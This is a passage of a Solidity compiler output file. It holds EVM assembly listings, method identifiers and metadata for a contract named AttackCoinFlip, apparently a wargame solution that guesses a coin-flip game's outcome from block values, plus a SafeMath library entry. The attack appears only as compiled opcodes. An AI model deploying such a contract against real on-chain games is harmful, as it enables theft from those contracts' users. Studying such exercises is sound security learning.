											"source": 3
										},
										{
											"begin": 442,
											"end": 532,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 442,
											"end": 532,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 442,
											"end": 532,
											"name": "JUMP",
											"source": 3,
											"value": "[out]"
										},
										{
											"begin": 538,
											"end": 647,
											"name": "tag",
											"source": 3,
											"value": "39"
										},
										{
											"begin": 538,
											"end": 647,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 619,
											"end": 640,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "59"
										},
										{
											"begin": 634,
											"end": 639,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 619,
											"end": 640,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "38"
										},
										{
											"begin": 619,
											"end": 640,
											"name": "JUMP",
											"source": 3,
											"value": "[in]"
										},
										{
											"begin": 619,
											"end": 640,
											"name": "tag",
											"source": 3,
											"value": "59"
										},
										{
											"begin": 619,
											"end": 640,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 614,
											"end": 617,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 607,
											"end": 641,
											"name": "MSTORE",
											"source": 3
										},
										{
											"begin": 538,
											"end": 647,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 538,
											"end": 647,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 538,
											"end": 647,
											"name": "JUMP",
											"source": 3,
											"value": "[out]"
										},
										{
											"begin": 653,
											"end": 863,
											"name": "tag",
											"source": 3,
											"value": "14"
										},
										{
											"begin": 653,
											"end": 863,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 740,
											"end": 744,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 778,
											"end": 780,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 767,
											"end": 776,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 763,
											"end": 781,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 755,
											"end": 781,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 755,
											"end": 781,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 791,
											"end": 856,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "61"
										},
										{
											"begin": 853,
											"end": 854,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 842,
											"end": 851,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 838,
											"end": 855,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 829,
											"end": 835,
											"name": "DUP5",
											"source": 3
										},
										{
											"begin": 791,
											"end": 856,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "39"
										},
										{
											"begin": 791,
											"end": 856,
											"name": "JUMP",
											"source": 3,
											"value": "[in]"
										},
										{
											"begin": 791,
											"end": 856,
											"name": "tag",
											"source": 3,
											"value": "61"
										},
										{
											"begin": 791,
											"end": 856,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 653,
											"end": 863,
											"name": "SWAP3",
											"source": 3
										},
										{
											"begin": 653,
											"end": 863,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 653,
											"end": 863,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 653,
											"end": 863,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 653,
											"end": 863,
											"name": "JUMP",
											"source": 3,
											"value": "[out]"
										},
										{
											"begin": 950,
											"end": 1067,
											"name": "tag",
											"source": 3,
											"value": "41"
										},
										{
											"begin": 950,
											"end": 1067,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 1059,
											"end": 1060,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 1056,
											"end": 1057,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 1049,
											"end": 1061,
											"name": "REVERT",
											"source": 3
										},
										{
											"begin": 1196,
											"end": 1322,
											"name": "tag",
											"source": 3,
											"value": "43"
										},
										{
											"begin": 1196,
											"end": 1322,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 1233,
											"end": 1240,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 1273,
											"end": 1315,
											"name": "PUSH",
											"source": 3,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1266,
											"end": 1271,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 1262,
											"end": 1316,
											"name": "AND",
											"source": 3
										},
										{
											"begin": 1251,
											"end": 1316,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 1251,
											"end": 1316,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 1196,
											"end": 1322,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 1196,
											"end": 1322,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 1196,
											"end": 1322,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 1196,
											"end": 1322,
											"name": "JUMP",
											"source": 3,
											"value": "[out]"
										},
										{
											"begin": 1328,
											"end": 1424,
											"name": "tag",
											"source": 3,
											"value": "44"
										},
										{
											"begin": 1328,
											"end": 1424,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 1365,
											"end": 1372,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 1394,
											"end": 1418,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "67"
										},
										{
											"begin": 1412,
											"end": 1417,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 1394,
											"end": 1418,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "43"
										},
										{
											"begin": 1394,
											"end": 1418,
											"name": "JUMP",
											"source": 3,
											"value": "[in]"
										},
										{
											"begin": 1394,
											"end": 1418,
											"name": "tag",
											"source": 3,
											"value": "67"
										},
										{
											"begin": 1394,
											"end": 1418,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 1383,
											"end": 1418,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 1383,
											"end": 1418,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 1328,
											"end": 1424,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 1328,
											"end": 1424,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 1328,
											"end": 1424,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 1328,
											"end": 1424,
											"name": "JUMP",
											"source": 3,
											"value": "[out]"
										},
										{
											"begin": 1430,
											"end": 1552,
											"name": "tag",
											"source": 3,
											"value": "45"
										},
										{
											"begin": 1430,
											"end": 1552,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 1503,
											"end": 1527,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "69"
										},
										{
											"begin": 1521,
											"end": 1526,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 1503,
											"end": 1527,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "44"
										},
										{
											"begin": 1503,
											"end": 1527,
											"name": "JUMP",
											"source": 3,
											"value": "[in]"
										},
										{
											"begin": 1503,
											"end": 1527,
											"name": "tag",
											"source": 3,
											"value": "69"
										},
										{
											"begin": 1503,
											"end": 1527,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 1496,
											"end": 1501,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 1493,
											"end": 1528,
											"name": "EQ",
											"source": 3
										},
										{
											"begin": 1483,
											"end": 1546,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "70"
										},
										{
											"begin": 1483,
											"end": 1546,
											"name": "JUMPI",
											"source": 3
										},
										{
											"begin": 1542,
											"end": 1543,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 1539,
											"end": 1540,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 1532,
											"end": 1544,
											"name": "REVERT",
											"source": 3
										},
										{
											"begin": 1483,
											"end": 1546,
											"name": "tag",
											"source": 3,
											"value": "70"
										},
										{
											"begin": 1483,
											"end": 1546,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 1430,
											"end": 1552,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 1430,
											"end": 1552,
											"name": "JUMP",
											"source": 3,
											"value": "[out]"
										},
										{
											"begin": 1558,
											"end": 1697,
											"name": "tag",
											"source": 3,
											"value": "46"
										},
										{
											"begin": 1558,
											"end": 1697,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 1604,
											"end": 1609,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 1642,
											"end": 1648,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 1629,
											"end": 1649,
											"name": "CALLDATALOAD",
											"source": 3
										},
										{
											"begin": 1620,
											"end": 1649,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 1620,
											"end": 1649,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 1658,
											"end": 1691,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "72"
										},
										{
											"begin": 1685,
											"end": 1690,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 1658,
											"end": 1691,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "45"
										},
										{
											"begin": 1658,
											"end": 1691,
											"name": "JUMP",
											"source": 3,
											"value": "[in]"
										},
										{
											"begin": 1658,
											"end": 1691,
											"name": "tag",
											"source": 3,
											"value": "72"
										},
										{
											"begin": 1658,
											"end": 1691,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 1558,
											"end": 1697,
											"name": "SWAP3",
											"source": 3
										},
										{
											"begin": 1558,
											"end": 1697,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 1558,
											"end": 1697,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 1558,
											"end": 1697,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 1558,
											"end": 1697,
											"name": "JUMP",
											"source": 3,
											"value": "[out]"
										},
										{
											"begin": 1703,
											"end": 2032,
											"name": "tag",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 1703,
											"end": 2032,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 1762,
											"end": 1768,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 1811,
											"end": 1813,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 1799,
											"end": 1808,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 1790,
											"end": 1797,
											"name": "DUP5",
											"source": 3
										},
										{
											"begin": 1786,
											"end": 1809,
											"name": "SUB",
											"source": 3
										},
										{
											"begin": 1782,
											"end": 1814,
											"name": "SLT",
											"source": 3
										},
										{
											"begin": 1779,
											"end": 1898,
											"name": "ISZERO",
											"source": 3
										},
										{
											"begin": 1779,
											"end": 1898,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "74"
										},
										{
											"begin": 1779,
											"end": 1898,
											"name": "JUMPI",
											"source": 3
										},
										{
											"begin": 1817,
											"end": 1896,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "75"
										},
										{
											"begin": 1817,
											"end": 1896,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "41"
										},
										{
											"begin": 1817,
											"end": 1896,
											"name": "JUMP",
											"source": 3,
											"value": "[in]"
										},
										{
											"begin": 1817,
											"end": 1896,
											"name": "tag",
											"source": 3,
											"value": "75"
										},
										{
											"begin": 1817,
											"end": 1896,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 1779,
											"end": 1898,
											"name": "tag",
											"source": 3,
											"value": "74"
										},
										{
											"begin": 1779,
											"end": 1898,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 1937,
											"end": 1938,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 1962,
											"end": 2015,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "76"
										},
										{
											"begin": 2007,
											"end": 2014,
											"name": "DUP5",
											"source": 3
										},
										{
											"begin": 1998,
											"end": 2004,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 1987,
											"end": 1996,
											"name": "DUP6",
											"source": 3
										},
										{
											"begin": 1983,
											"end": 2005,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 1962,
											"end": 2015,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "46"
										},
										{
											"begin": 1962,
											"end": 2015,
											"name": "JUMP",
											"source": 3,
											"value": "[in]"
										},
										{
											"begin": 1962,
											"end": 2015,
											"name": "tag",
											"source": 3,
											"value": "76"
										},
										{
											"begin": 1962,
											"end": 2015,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 1952,
											"end": 2015,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 1952,
											"end": 2015,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 1908,
											"end": 2025,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 1703,
											"end": 2032,
											"name": "SWAP3",
											"source": 3
										},
										{
											"begin": 1703,
											"end": 2032,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 1703,
											"end": 2032,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 1703,
											"end": 2032,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 1703,
											"end": 2032,
											"name": "JUMP",
											"source": 3,
											"value": "[out]"
										},
										{
											"begin": 2038,
											"end": 2154,
											"name": "tag",
											"source": 3,
											"value": "47"
										},
										{
											"begin": 2038,
											"end": 2154,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 2108,
											"end": 2129,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "78"
										},
										{
											"begin": 2123,
											"end": 2128,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 2108,
											"end": 2129,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "38"
										},
										{
											"begin": 2108,
											"end": 2129,
											"name": "JUMP",
											"source": 3,
											"value": "[in]"
										},
										{
											"begin": 2108,
											"end": 2129,
											"name": "tag",
											"source": 3,
											"value": "78"
										},
										{
											"begin": 2108,
											"end": 2129,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 2101,
											"end": 2106,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 2098,
											"end": 2130,
											"name": "EQ",
											"source": 3
										},
										{
											"begin": 2088,
											"end": 2148,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "79"
										},
										{
											"begin": 2088,
											"end": 2148,
											"name": "JUMPI",
											"source": 3
										},
										{
											"begin": 2144,
											"end": 2145,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 2141,
											"end": 2142,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 2134,
											"end": 2146,
											"name": "REVERT",
											"source": 3
										},
										{
											"begin": 2088,
											"end": 2148,
											"name": "tag",
											"source": 3,
											"value": "79"
										},
										{
											"begin": 2088,
											"end": 2148,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 2038,
											"end": 2154,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 2038,
											"end": 2154,
											"name": "JUMP",
											"source": 3,
											"value": "[out]"
										},
										{
											"begin": 2160,
											"end": 2297,
											"name": "tag",
											"source": 3,
											"value": "48"
										},
										{
											"begin": 2160,
											"end": 2297,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 2214,
											"end": 2219,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 2245,
											"end": 2251,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 2239,
											"end": 2252,
											"name": "MLOAD",
											"source": 3
										},
										{
											"begin": 2230,
											"end": 2252,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 2230,
											"end": 2252,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 2261,
											"end": 2291,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "81"
										},
										{
											"begin": 2285,
											"end": 2290,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 2261,
											"end": 2291,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "47"
										},
										{
											"begin": 2261,
											"end": 2291,
											"name": "JUMP",
											"source": 3,
											"value": "[in]"
										},
										{
											"begin": 2261,
											"end": 2291,
											"name": "tag",
											"source": 3,
											"value": "81"
										},
										{
											"begin": 2261,
											"end": 2291,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 2160,
											"end": 2297,
											"name": "SWAP3",
											"source": 3
										},
										{
											"begin": 2160,
											"end": 2297,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 2160,
											"end": 2297,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 2160,
											"end": 2297,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 2160,
											"end": 2297,
											"name": "JUMP",
											"source": 3,
											"value": "[out]"
										},
										{
											"begin": 2303,
											"end": 2648,
											"name": "tag",
											"source": 3,
											"value": "32"
										},
										{
											"begin": 2303,
											"end": 2648,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 2370,
											"end": 2376,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 2419,
											"end": 2421,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 2407,
											"end": 2416,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 2398,
											"end": 2405,
											"name": "DUP5",
											"source": 3
										},
										{
											"begin": 2394,
											"end": 2417,
											"name": "SUB",
											"source": 3
										},
										{
											"begin": 2390,
											"end": 2422,
											"name": "SLT",
											"source": 3
										},
										{
											"begin": 2387,
											"end": 2506,
											"name": "ISZERO",
											"source": 3
										},
										{
											"begin": 2387,
											"end": 2506,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "83"
										},
										{
											"begin": 2387,
											"end": 2506,
											"name": "JUMPI",
											"source": 3
										},
										{
											"begin": 2425,
											"end": 2504,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "84"
										},
										{
											"begin": 2425,
											"end": 2504,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "41"
										},
										{
											"begin": 2425,
											"end": 2504,
											"name": "JUMP",
											"source": 3,
											"value": "[in]"
										},
										{
											"begin": 2425,
											"end": 2504,
											"name": "tag",
											"source": 3,
											"value": "84"
										},
										{
											"begin": 2425,
											"end": 2504,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 2387,
											"end": 2506,
											"name": "tag",
											"source": 3,
											"value": "83"
										},
										{
											"begin": 2387,
											"end": 2506,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 2545,
											"end": 2546,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 2570,
											"end": 2631,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "85"
										},
										{
											"begin": 2623,
											"end": 2630,
											"name": "DUP5",
											"source": 3
										},
										{
											"begin": 2614,
											"end": 2620,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 2603,
											"end": 2612,
											"name": "DUP6",
											"source": 3
										},
										{
											"begin": 2599,
											"end": 2621,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 2570,
											"end": 2631,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "48"
										},
										{
											"begin": 2570,
											"end": 2631,
											"name": "JUMP",
											"source": 3,
											"value": "[in]"
										},
										{
											"begin": 2570,
											"end": 2631,
											"name": "tag",
											"source": 3,
											"value": "85"
										},
										{
											"begin": 2570,
											"end": 2631,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 2560,
											"end": 2631,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 2560,
											"end": 2631,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 2516,
											"end": 2641,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 2303,
											"end": 2648,
											"name": "SWAP3",
											"source": 3
										},
										{
											"begin": 2303,
											"end": 2648,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 2303,
											"end": 2648,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 2303,
											"end": 2648,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 2303,
											"end": 2648,
											"name": "JUMP",
											"source": 3,
											"value": "[out]"
										},
										{
											"begin": 2654,
											"end": 2834,
											"name": "tag",
											"source": 3,
											"value": "49"
										},
										{
											"begin": 2654,
											"end": 2834,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 2702,
											"end": 2779,
											"name": "PUSH",
											"source": 3,
											"value": "4E487B7100000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 2699,
											"end": 2700,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 2692,
											"end": 2780,
											"name": "MSTORE",
											"source": 3
										},
										{
											"begin": 2799,
											"end": 2803,
											"name": "PUSH",
											"source": 3,
											"value": "12"
										},
										{
											"begin": 2796,
											"end": 2797,
											"name": "PUSH",
											"source": 3,
											"value": "4"
										},
										{
											"begin": 2789,
											"end": 2804,
											"name": "MSTORE",
											"source": 3
										},
										{
											"begin": 2823,
											"end": 2827,
											"name": "PUSH",
											"source": 3,
											"value": "24"
										},
										{
											"begin": 2820,
											"end": 2821,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 2813,
											"end": 2828,
											"name": "REVERT",
											"source": 3
										},
										{
											"begin": 3026,
											"end": 3211,
											"name": "tag",
											"source": 3,
											"value": "35"
										},
										{
											"begin": 3026,
											"end": 3211,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 3066,
											"end": 3067,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 3083,
											"end": 3103,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "89"
										},
										{
											"begin": 3101,
											"end": 3102,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 3083,
											"end": 3103,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "36"
										},
										{
											"begin": 3083,
											"end": 3103,
											"name": "JUMP",
											"source": 3,
											"value": "[in]"
										},
										{
											"begin": 3083,
											"end": 3103,
											"name": "tag",
											"source": 3,
											"value": "89"
										},
										{
											"begin": 3083,
											"end": 3103,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 3078,
											"end": 3103,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 3078,
											"end": 3103,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 3117,
											"end": 3137,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "90"
										},
										{
											"begin": 3135,
											"end": 3136,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 3117,
											"end": 3137,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "36"
										},
										{
											"begin": 3117,
											"end": 3137,
											"name": "JUMP",
											"source": 3,
											"value": "[in]"
										},
										{
											"begin": 3117,
											"end": 3137,
											"name": "tag",
											"source": 3,
											"value": "90"
										},
										{
											"begin": 3117,
											"end": 3137,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 3112,
											"end": 3137,
											"name": "SWAP3",
											"source": 3
										},
										{
											"begin": 3112,
											"end": 3137,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 3156,
											"end": 3157,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 3146,
											"end": 3181,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "91"
										},
										{
											"begin": 3146,
											"end": 3181,
											"name": "JUMPI",
											"source": 3
										},
										{
											"begin": 3161,
											"end": 3179,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "92"
										},
										{
											"begin": 3161,
											"end": 3179,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "49"
										},
										{
											"begin": 3161,
											"end": 3179,
											"name": "JUMP",
											"source": 3,
											"value": "[in]"
										},
										{
											"begin": 3161,
											"end": 3179,
											"name": "tag",
											"source": 3,
											"value": "92"
										},
										{
											"begin": 3161,
											"end": 3179,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 3146,
											"end": 3181,
											"name": "tag",
											"source": 3,
											"value": "91"
										},
										{
											"begin": 3146,
											"end": 3181,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 3203,
											"end": 3204,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 3200,
											"end": 3201,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 3196,
											"end": 3205,
											"name": "DIV",
											"source": 3
										},
										{
											"begin": 3191,
											"end": 3205,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 3191,
											"end": 3205,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 3026,
											"end": 3211,
											"name": "SWAP3",
											"source": 3
										},
										{
											"begin": 3026,
											"end": 3211,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 3026,
											"end": 3211,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 3026,
											"end": 3211,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 3026,
											"end": 3211,
											"name": "JUMP",
											"source": 3,
											"value": "[out]"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"attack(address)": "d018db3e",
							"guessTheCurrentBlockValue()": "99b084bf",
							"guessing()": "79e41b39",
							"guessingValue()": "3fe6dd29"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.13+commit.abaa5c0e\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_contract\",\"type\":\"address\"}],\"name\":\"attack\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"guessTheCurrentBlockValue\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"guessing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"guessingValue\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"CoinFlip/attackCoinFlip.sol\":\"AttackCoinFlip\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"CoinFlip/CoinFlip.sol\":{\"keccak256\":\"0xb457917871803c6d0df90c5d847bcbd6adb0a72834b471c6f68bc3ffa3517baa\",\"urls\":[\"bzz-raw://cfa3e3de574795cfd9437b67473f222319f0980f94fdde5f6abb5abf48f56474\",\"dweb:/ipfs/QmWmVGubGhWsN1wqtJq5xLdyoiMdHraaBk8yShobG9QcsX\"]},\"CoinFlip/attackCoinFlip.sol\":{\"keccak256\":\"0x90b9da3d7de104b8b99193d606d7f2e92b1f31060aea28107c84f429272f8a28\",\"urls\":[\"bzz-raw://cd74fac76f743f2ddfddbd7f19d481ce89ce99f7cd9cd8a94661380e3a6e445c\",\"dweb:/ipfs/QmR6JxuNZpd8jgoeFTNHfbZCGMEmvbJjZqPLRWmZ3KdK7x\"]},\"Fallback/SafeMath.sol\":{\"keccak256\":\"0x46eb1d4c81eed2dd868bc0a1b411e0c7a70cb9ecde086a58aee97e97134e27a4\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://87db288de7f3ebb5d38bcb26b123b7e1e14d43b5527cbad22e75337baa7b8f6f\",\"dweb:/ipfs/QmZ7ALuXLEoexu1uVqrve6kXMqkHzvL3qf7BMtdoLEA2vA\"]}},\"version\":1}",
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			},
			"Fallback/SafeMath.sol": {
				"SafeMath": {
					"abi": [],
					"devdoc": {
						"details": "Wrappers over Solidity's arithmetic operations. NOTE: `SafeMath` is generally not needed starting with Solidity 0.8, since the compiler now has built in overflow checking.",
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"Fallback/SafeMath.sol\":482:6993  library SafeMath {... */\n  dataSize(sub_0)\n  dataOffset(sub_0)\n  0x0b\n  dup3\n  dup3\n  dup3\n  codecopy\n  dup1\n  mload\n  0x00\n  byte\n  0x73\n  eq\n  tag_1\n  jumpi\n  mstore(0x00, 0x4e487b7100000000000000000000000000000000000000000000000000000000)\n  mstore(0x04, 0x00)\n  revert(0x00, 0x24)\ntag_1:\n  mstore(0x00, address)\n  0x73\n  dup2\n  mstore8\n  dup3\n  dup2\n  return\nstop\n\nsub_0: assembly {\n        /* \"Fallback/SafeMath.sol\":482:6993  library SafeMath {... */\n      eq(address, deployTimeAddress())\n      mstore(0x40, 0x80)\n      0x00\n      dup1\n      revert\n\n    auxdata: 0xa2646970667358221220ffe9a8e812ffea419496bc3f60b9af012c72735514b8fa17c90550ea5480dedd64736f6c634300080d0033\n}\n",
						"bytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"linkReferences": {},
							"object": "60566050600b82828239805160001a6073146043577f4e487b7100000000000000000000000000000000000000000000000000000000600052600060045260246000fd5b30600052607381538281f3fe73000000000000000000000000000000000000000030146080604052600080fdfea2646970667358221220ffe9a8e812ffea419496bc3f60b9af012c72735514b8fa17c90550ea5480dedd64736f6c634300080d0033",
